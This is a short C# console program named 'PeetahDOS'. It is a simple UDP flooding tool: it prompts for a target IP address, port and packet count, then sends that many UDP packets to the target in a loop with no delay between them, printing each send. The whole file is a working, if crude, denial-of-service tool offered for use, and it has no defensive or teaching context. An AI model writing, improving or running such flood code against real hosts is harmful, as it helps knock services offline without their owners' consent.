namespace PeetahDOS
{
    using System.Threading;
    using System;
    using System.Net;
    using System.Net.Sockets;
    using System.Text;
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write(@"                                                                       
,------.                 ,--.          ,--.     ,------.                 
|  .--. ' ,---.  ,---. ,-'  '-. ,--,--.|  ,---. |  .-.  \  ,---.  ,---.  
|  '--' || .-. :| .-. :'-.  .-'' ,-.  ||  .-.  ||  |  \  :| .-. |(  .-'  
|  | --' \   --.\   --.  |  |  \ '-'  ||  | |  ||  '--'  /' '-' '.-'  `) 
`--'      `----' `----'  `--'   `--`--'`--' `--'`-------'  `---' `----'  
");
            Console.ForegroundColor = ConsoleColor.White;

            Console.WriteLine("\nWelcome to PeetahDOS\n");

            Console.WriteLine("Enter IP:");
            string ipstring = Console.ReadLine();

            Console.WriteLine("\nEnter Port:");
            string portstring = Console.ReadLine();
            int port = int.Parse(portstring);

            Console.WriteLine("\nEnter Packet Amount:");
            string repeatstring = Console.ReadLine();
            int repeat = int.Parse(repeatstring);

            try
            {
                IPAddress ipAddress = IPAddress.Parse(ipstring);
                IPEndPoint iPEndPoint = new IPEndPoint(ipAddress, port);

                using (UdpClient udpClient = new UdpClient())
                {
                    for (int i = 0; i < repeat; i++)
                    {
                        string message = $"UDP Packet {i + 1}/{repeat}";
                        byte[] data = Encoding.ASCII.GetBytes(message);

                        // Send to the specified endpoint
                        udpClient.Send(data, data.Length, iPEndPoint);

                        Console.WriteLine($"Sent {data.Length} bytes to {ipAddress}:{port}");
                        Console.WriteLine($"Content: {message}");

                        if (i < repeat - 1)
                        {
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"\nError: {ex.Message}");
                Console.ReadKey(true);
            }
        }
    }
}